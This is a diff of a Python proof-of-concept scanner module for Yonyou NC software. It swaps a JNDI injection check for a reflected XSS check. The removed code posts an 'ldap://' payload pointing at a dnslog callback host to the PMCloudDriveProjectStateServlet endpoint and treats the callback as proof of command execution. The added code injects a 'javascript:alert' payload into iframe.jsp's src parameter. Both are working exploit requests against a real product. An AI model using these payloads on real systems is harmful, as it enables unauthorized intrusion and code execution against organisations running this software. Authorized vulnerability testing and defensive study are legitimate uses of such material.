@@ -1,6 +1,6 @@
 '''
 Function:
-    用友NC Cloud PMCloudDriveProjectStateServlet JNDI注入漏洞
+    yonyouNC xss漏洞
 Author:
     花果山
 Wechat official account：
@@ -16,15 +16,11 @@ GitHub:
 '''
 # -*- coding: utf-8 -*-
 import requests
-import re
-import os
-import sys
+import random
+import string
 from urllib.parse import urlparse
 from requests.packages.urllib3 import disable_warnings
 disable_warnings()
-path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-sys.path.append(path)
-from modules.dnslogs import dnslogs
 
 
 class poc:
@@ -32,9 +28,7 @@ class poc:
         self.url = url
         self.headers = {
             'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
-            'Content-Type': 'application/json'
         }
-        self.value_list = []
         self.result_text = ""
         self.proxies = proxies
 
@@ -42,25 +36,21 @@ class poc:
         url = urlparse(self.url)
         netloc = url.netloc
         scheme = url.scheme
-        return scheme, netloc
+        return netloc, scheme
 
     def vuln(self, netloc, scheme):
-        dnslog_all = dnslogs(self.proxies).get_dnslog()
-        dnslog = dnslog_all[0]
-        url = "{}://{}/service/~pim/PMCloudDriveProjectStateServlet".format(scheme, netloc)
-        data = '{"data_source": "ldap://' + dnslog + '","user": ""}'
+        char = ''.join(random.sample(string.ascii_letters + string.digits, 8))
+        payload = "test" + char
+        url = "{}://{}/uapws/pages/iframe.jsp?src=javascript:alert({})".format(scheme, netloc, payload)
         try:
-            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
-            for i in range(5):
-                dnslog_result = dnslogs(self.proxies).get_result(dnslog_all[1])
-            if dnslog_result != "[]":
+            result = requests.get(url=url, headers=self.headers, proxies=self.proxies, verify=False, timeout=3)
+            if payload in result.text:
                 target = urlparse(url)
-                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意命令执行漏洞\033[0m
-                 POST {} HTTP/1.1
-                 Host: {}""".format(target.path, target.netloc)
+                self.result_text += """\n        [+]    \033[32m检测到目标站点存在跨站脚本注入攻击漏洞\033[0m
+                 GET {} HTTP/1.1
+                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                 for request_type, request_text in dict(result.request.headers).items():
                     self.result_text += "\n                 {}: {}".format(request_type, request_text)
-                self.result_text += "\n\n                 {}".format(data)
                 return True
             else:
                 return False
@@ -69,11 +59,9 @@ class poc:
 
     def main(self):
         all = self.host()
-        scheme = all[0]
-        netloc = all[1]
+        netloc = all[0]
+        scheme = all[1]
         if self.vuln(netloc, scheme):
-             return self.result_text
+            return self.result_text
         else:
             return False
-
-
